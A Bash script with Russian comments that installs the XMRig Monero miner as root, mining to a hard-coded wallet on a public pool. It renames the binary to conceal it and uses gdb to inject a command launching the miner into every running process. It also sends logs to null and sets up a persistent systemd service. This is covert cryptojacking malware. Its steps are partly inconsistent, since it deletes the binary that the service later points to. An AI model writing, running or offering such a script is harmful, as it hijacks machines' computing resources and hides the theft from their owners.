#!/bin/bash

# Проверка, что скрипт выполняется от имени root
if [ "$(id -u)" -ne "0" ]; then
    echo "Этот скрипт нужно запускать от имени root." >&2
    exit 1
fi

echo "Начало установки XMRig..."

# Установка зависимостей
echo "Установка зависимостей..."
if [ -f /etc/redhat-release ]; then
    yum install -y epel-release
    yum install -y wget tar gzip gdb
elif [ -f /etc/debian_version ]; then
    apt update
    apt install -y wget tar gzip gdb
else
    echo "Не поддерживаемая система." >&2
    exit 1
fi

# Создание директории для XMRig
echo "Создание директории /etc/xmrig..."
mkdir -p /etc/xmrig

# Загрузка и установка XMRig
echo "Загрузка XMRig..."
XMRIG_VERSION="6.20.0"  # Убедитесь, что версия актуальна
wget "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz" -O /tmp/xmrig.tar.gz

echo "Распаковка XMRig..."
tar -xzf /tmp/xmrig.tar.gz -C /tmp

echo "Установка XMRig..."
cp /tmp/xmrig-${XMRIG_VERSION}/xmrig /etc/xmrig/xmrig
rm -rf /tmp/xmrig*

# Создание конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
cat <<EOF > /etc/xmrig/config.json
{
  "autosave": true,
  "cpu": true,
  "pools": [
    {
      "url": "xmr-eu1.nanopool.org:14444",
      "user": "4A9SeKhwWx8DtAboVp1e1LdbgrRJxvjEFNh4VNw1NDng6ELLeKJPVrPQ9n9eNc4iLVC4BKeR4egnUL68D1qUmdJ7N3TaB5w",
      "pass": "x",
      "coin": "monero"
    }
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOF

# Переименование XMRig для скрытия
echo "Переименование XMRig для скрытия..."
mv /etc/xmrig/xmrig /tmp/xmrig-hidden

# Запуск XMRig в фоне
echo "Запуск XMRig в фоне..."
/tmp/xmrig-hidden --config /etc/xmrig/config.json &

# Ожидание старта XMRig
sleep 5

# Инжекция XMRig в все процессы
echo "Инжекция XMRig во все процессы..."
for PID in $(ps -e -o pid=); do
    if [ "$PID" -ne "$$" ]; then
        echo "Инжекция в процесс $PID..."
        # Инжекция с помощью gdb
        gdb -p $PID -ex "call (void)system(\"/tmp/xmrig-hidden\")" -ex quit
    fi
done

# Удаление временного файла XMRig
echo "Удаление временного файла XMRig..."
rm /tmp/xmrig-hidden

# Создание systemd сервиса
echo "Создание systemd сервиса для XMRig..."
cat <<EOF > /etc/systemd/system/xmrig.service
[Unit]
Description=XMRig
After=network.target

[Service]
ExecStart=/tmp/xmrig-hidden --config /etc/xmrig/config.json
Restart=always
User=nobody
Group=nogroup
# Перенаправляем вывод в null, чтобы скрыть логи
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# Перезагрузка systemd и запуск XMRig
echo "Перезагрузка systemd и запуск XMRig..."
systemctl daemon-reload
systemctl enable xmrig

# Запуск XMRig сразу после установки
if systemctl is-active --quiet xmrig; then
    echo "XMRig уже запущен."
else
    systemctl start xmrig
    echo "XMRig запущен."
fi

echo "Установка и настройка XMRig завершены успешно."
